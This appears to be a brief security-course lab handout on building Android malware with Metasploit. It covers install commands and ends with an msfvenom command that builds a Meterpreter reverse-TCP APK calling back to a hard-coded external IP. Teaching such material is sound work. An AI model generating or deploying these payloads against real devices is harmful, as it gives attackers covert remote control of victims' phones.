# Lab 7: Developing Mobile Malware

## Set-up

Install [Metasploit](https://www.metasploit.com/) Module


```sh
$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
$ chmod 755 msfinstall
$ ./msfinstall
```

Install [Android Studio](https://developer.android.com/studio)

```
$ wget https://redirector.gvt1.com/edgedl/android/studio/ide-zips/4.2.1.0/android-studio-ide-202.7351085-linux.tar.gz
$ sudo tar -xzf android-studio-ide-202.7351085-linux.tar.gz -C /usr/local
$ sudo ./usr/local/android-studio/bin/studio.sh
```

Install [Keytool]()

## Explore Metasploits [^ex]

```
$ msfconsole
msf >  search type:payload platform:android
```

Create a reversed TCP

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=141.210.133.38 LPORT=4444 -f raw -o reverse_tcp.apk
```

[^ex]: https://www.hackers-arise.com/post/2018/07/06/metasploit-basics-part-13-exploiting-android-mobile-devices

